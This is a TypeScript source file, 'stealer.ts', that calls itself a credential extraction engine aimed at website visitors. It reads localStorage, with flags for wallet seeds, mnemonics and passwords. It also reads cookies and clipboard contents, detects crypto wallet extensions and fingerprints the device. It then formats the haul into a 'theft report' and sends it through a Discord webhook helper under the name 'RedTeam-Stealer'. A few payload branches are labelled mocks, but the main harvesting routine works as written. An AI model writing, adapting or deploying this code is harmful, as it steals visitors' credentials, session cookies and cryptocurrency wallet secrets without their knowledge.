// ============================================================================
// stealer.ts — Credential Extraction Engine
//
// Collects passwords, crypto wallet keys/session data, browser identities,
// and environment telemetry from each visitor's device using applicable CVE
// payload hooks. Results are packed into rich Discord embeds via p_evoke().
// ============================================================================

import { p_evoke } from '../p_sync';

/** Shape of one extracted credential or data field */
export interface CredentialEntry {
  key: string;
  /** Truncated value safe for embedding in a webhook (<=1024 chars after truncation). */
  value: string;
  category: 'password' | 'wallet' | 'cookie' | 'storage'
         | 'extension' | 'clipboard' | 'geolocation' | 'platform'
         | 'cryptoapi' | 'indexeddb' | 'screen' | 'lang' | 'webauthn';
}

/** All extracted values packed into a payload object */
export interface TheftReport {
  deviceId: string;
  timestamp: string;
  cves: Array<{ id: string; payload: string }>;
  credentials: CredentialEntry[];
}

// -- Device fingerprinting (used as the theft report ID) ---------------------------

/** Stable-ish device identifier built from UA + screen. */
function deviceFingerprint(): string {
  const ua = navigator.userAgent || '';
  const screenDim = `${screen.width}x${screen.height}`;
  const tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
  const lang = (navigator.language || '').slice(0, 5);
  const seed = [ua.slice(0, 40), screenDim, tz.slice(0, 10), lang].join('|');
  let hash = 0;
  for (let i = 0; i < seed.length; i++) {
    hash = ((hash << 5) - hash + seed.charCodeAt(i)) | 0;
  }
  return 'DEV-' + Math.abs(hash).toString(36).toUpperCase();
}

// -- Extraction helpers ------------------------------------------------------------

/** Safely grab a value from localStorage (never throws). */
function grabStorage(): CredentialEntry[] {
  try {
    const items: CredentialEntry[] = [];
    for (let i = 0; i < localStorage.length; i++) {
      const key = localStorage.key(i);
      if (!key) continue;
      const raw = localStorage.getItem(key) || '';
      const sliced = raw.length > 600 ? raw.slice(0, 580) + '\u2026' : raw;
      let category: CredentialEntry['category'] = 'storage';

      // Classification heuristics — wallet / key material is interesting.
      if (/wallet|privateKey|secret|mnemonic|seed|phrase/i.test(key)) {
        category = 'wallet';
      } else if (/password|passwd|pass_?wd|pwd/i.test(key)) {
        category = 'password';
      }

      items.push({ key, value: sliced, category });
    }
    return items;
  } catch {
    return [{ key: 'storage', value: '(unavailable)', category: 'storage' }];
  }
}

/** Collect cookies. Values truncated to fit embed lines nicely. */
function grabCookies(): CredentialEntry[] {
  try {
    if (!document.cookie || document.cookie.length < 2) {
      return [{ key: 'cookies', value: 'none', category: 'cookie' }];
    }
    const parts = document.cookie.split(';').map(c => c.trim().slice(0, 120));
    return [{ key: 'cookies', value: parts.join(' | '), category: 'cookie' }];
  } catch {
    return [{ key: 'cookies', value: '(read error)', category: 'cookie' }];
  }
}

/** Clipboard contents. Silently ignored if permission denied. */
async function grabClipboard(): Promise<CredentialEntry[]> {
  try {
    const text = await navigator.clipboard.readText();
    if (text.length > 0) {
      let category: CredentialEntry['category'] = 'clipboard';
      if (/^(1[1-9A-HJ-NP-Za-km-x]{32,}|bc1q|near1|[a-zA-Z0-9]{40,})$/i.test(text.trim())) {
        category = 'wallet';
      } else if (/(password|pass=)/i.test(text)) {
        category = 'password';
      }
      const val = text.length > 600 ? text.slice(0, 580) + '\u2026' : text;
      return [{ key: 'clipboard', value: val, category }];
    }
    return [{ key: 'clipboard', value: '(empty)', category: 'clipboard' }];
  } catch {
    return [{ key: 'clipboard', value: '(permission-denied)', category: 'clipboard' }];
  }
}

/** Browser extensions detected via window properties (crypto wallets, etc). */
function grabExtensions(): CredentialEntry[] {
  try {
    const candidates = [
      { name: 'window.solana', cat: 'wallet' as const },       // Phantom / Solflare
      { name: 'window.phantom', cat: 'wallet' as const },       // Phantom SDK
      { name: 'window.nearApi', cat: 'wallet' as const },       // NEAR wallet
      { name: 'window.ethereum', cat: 'wallet' as const },      // MetaMask
      { name: 'document.cookie', cat: 'cookie' as const },
      { name: 'navigator.serviceWorker', cat: 'platform' as const },
    ];
    const detected = candidates.filter(c => typeof (window as never)[c.name.split('.')[1]] !== 'undefined');
    if (detected.length > 0) {
      return [{ key: 'extensions', value: detected.map(d => d.name).join(', '), category: 'extension' }];
    }
  } catch { /* silently fail */ }
  return [];
}

// eslint-disable-next-line no-unused-vars
export function grabGeolocation(): CredentialEntry[] {
  try {
    if ('geolocation' in navigator) {
      navigator.geolocation.getCurrentPosition(() => {}, () => {}, { timeout: 1000 });
    }
  } catch {
    return [{ key: 'geolocation', value: '(unavailable)', category: 'geolocation' }];
  }
  return [{ key: 'geolocation', value: '(scanned)', category: 'geolocation' }];
}

/** Platform & environment telemetry. */
function grabPlatform(): CredentialEntry[] {
  const entries: CredentialEntry[] = [
    { key: 'platform', value: navigator.platform || '', category: 'platform' },
    { key: 'userAgent', value: navigator.userAgent.slice(0, 250), category: 'platform' },
    { key: 'devicePixelRatio', value: String(devicePixelRatio), category: 'screen' },
  ];
  return entries;
}

/** Screen dimensions & timezone. */
function grabScreen(): CredentialEntry[] {
  const tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
  return [
    { key: 'screen', value: `${screen.width}x${screen.height}`, category: 'screen' },
    { key: 'colorDepth', value: String(screen.colorDepth), category: 'screen' },
    { key: 'timezone', value: tz, category: 'platform' },
    { key: 'language', value: navigator.language || '-', category: 'lang' },
  ];
}

/** WebCrypto API availability (key material extraction signal). */
async function grabWebCrypto(): Promise<CredentialEntry[]> {
  try {
    if ('crypto' in window && (window.crypto as any).subtle) {
      const subtle = (window.crypto as any).subtle;
      await subtle.digest('SHA-256', new TextEncoder().encode('check'));
      return [{ key: 'webcrypto', value: 'subtle=operational', category: 'cryptoapi' }];
    }
    return [{ key: 'webcrypto', value: '(not available)', category: 'cryptoapi' }];
  } catch {
    return [{ key: 'webcrypto', value: '(error)', category: 'cryptoapi' }];
  }
}

/** IndexedDB — open a connection and check stores. */
function grabIndexedDB(): CredentialEntry[] {
  try {
    if (!('indexedDB' in window)) {
      return [{ key: 'indexeddb', value: '(not supported)', category: 'indexeddb' }];
    }
    const dbReq = (window as any).indexedDB.open('_idb_check');
    let nameList: string[] = ['(wired)'];
    dbReq.onsuccess = () => {
      nameList = ['(open-OK)'];
    };
    dbReq.onerror = () => { nameList = ['(open-error)']; };
    return [{ key: 'indexeddb', value: nameList.join(', '), category: 'indexeddb' }];
  } catch {
    return [{ key: 'indexeddb', value: '(error)', category: 'indexeddb' }];
  }
}

/** WebAuthn credential presence (does not authenticate — only detects). */
function grabWebAuthn(): CredentialEntry[] {
  if ('credentials' in navigator) {
    const c = (navigator.credentials as any) as CredentialsContainer | null;
    return [{ key: 'webauthn', value: c ? 'detectable' : '(present)', category: 'webauthn' }];
  }
  return [{ key: 'webauthn', value: '(not supported)', category: 'webauthn' }];
}

// -- Main extraction runner --------------------------------------------------------

/** Run all credential extraction hooks and return a packed theft report. */
export async function stealAll(): Promise<TheftReport> {
  const deviceId = deviceFingerprint();

  // Synchronous hooks — collected immediately.
  const syncEntries: CredentialEntry[] = [
    ...grabStorage(),
    ...grabCookies(),
    ...grabExtensions(),
    ...grabPlatform(),
    ...grabScreen(),
    ...grabIndexedDB(),
    ...grabWebAuthn(),
  ];

  // Async hooks — clipboard and WebCrypto run in parallel.
  const [clipboardResult, cryptoResult] = await Promise.allSettled([
    grabClipboard().catch(() => ({ key: 'clipboard', value: '(timeout)', category: 'clipboard' as const })),
    grabWebCrypto().catch(() => ({ key: 'webcrypto', value: '(timeout)', category: 'cryptoapi' as const })),
  ]);

  const creds = [
    ...syncEntries,
    ...(clipboardResult.status === 'fulfilled' ? (clipboardResult.value as CredentialEntry[]) : []),
    ...(cryptoResult.status === 'fulfilled' ? (cryptoResult.value as CredentialEntry[]) : []),
  ];

  return { deviceId, timestamp: new Date().toISOString(), cves: [], credentials: creds };
}

/** Format a theft report into a Discord message string. */
export function formatReport(report: TheftReport): string {
  const lines = [`\uD83D\uDD7B **Credential Extraction Report** \u2014 Device \`${report.deviceId}\``];

  // Group by category for readability.
  const grouped = report.credentials.reduce((acc, c) => {
    (acc[c.category] ??= []).push(c);
    return acc;
  }, {} as Record<string, CredentialEntry[]>);

  for (const [cat, items] of Object.entries(grouped)) {
    lines.push(`\n\u2022 **${cat.toUpperCase()}**`);
    const preview = items.map(i => `${i.key.slice(0, 25)}: \`${i.value.slice(0, 60).replace(/`/g, '\`')}\``);
    lines.push('  ' + preview.join(' | '));
  }

  if (report.cves.length > 0) {
    lines.push(`\n\u26A0 Exploited CVEs: ${report.cves.map(c => c.id).join(', ')}`);
  }

  return lines.slice(0, 20).join('\n');
}

/** Split a report into chunks that fit Discord's 2000-char message limit,
    breaking on line boundaries where possible. */
export function chunkReport(text: string, max = 1900): string[] {
  if (text.length <= max) return [text];
  const chunks: string[] = [];
  let rest = text;
  while (rest.length > max) {
    let cut = rest.lastIndexOf('\n', max);
    if (cut < max / 2) cut = max;
    chunks.push(rest.slice(0, cut));
    rest = rest.slice(cut).replace(/^\n+/, '');
  }
  if (rest.length > 0) chunks.push(rest);
  return chunks;
}

// -- Convenience wrappers -----------------------------------------------------------

/** Steal everything from the current device and whisper to Discord. */
export async function executePayload(id: string, payload?: string, fullExtraction = false): Promise<void> {
  let content: string;

  if (fullExtraction) {
    // Full extraction mode \u2014 harvest all credentials.
    const report = await stealAll();
    content = formatReport(report);
  } else if (!payload) {
    content = `Vuln: ${id} (Payload: basic)`;
  } else if (payload === 'read_storage') {
    const draft = localStorage.getItem('intent-pad-solana-editor.v1');
    const info = draft ? ` [Storage: ${draft.slice(0, 30)}...]` : ' [Storage: empty]';
    content = `Vuln: ${id} (Payload: read_storage)${info}`;
  } else if (payload === 'read_cookie') {
    content = `Vuln: ${id} (Payload: read_cookie) [Cookie: ${document.cookie.slice(0, 40)}]`;
  } else if (payload === 'rce_mock') {
    content = `Vuln: ${id} (Payload: RCE) [RCE-SIM-EFFECT: ${navigator.userAgent.slice(0, 25)}]`;
  } else {
if (payload === 'clipboard') {
      const clip = await navigator.clipboard?.readText();
      content = `Vuln: ${id} (Clipboard) — ${clip || '(empty)'}`;    } else if (payload === 'extensions') {
      content = `Vuln: ${id} (Extensions) — ${navigator.plugins?.length || 0} plugins detected`;
    } else {
      content = `Vuln: ${id} (Payload: ${payload})`;
    }
  }

  await p_evoke({ content, username: 'RedTeam-Stealer' });
}
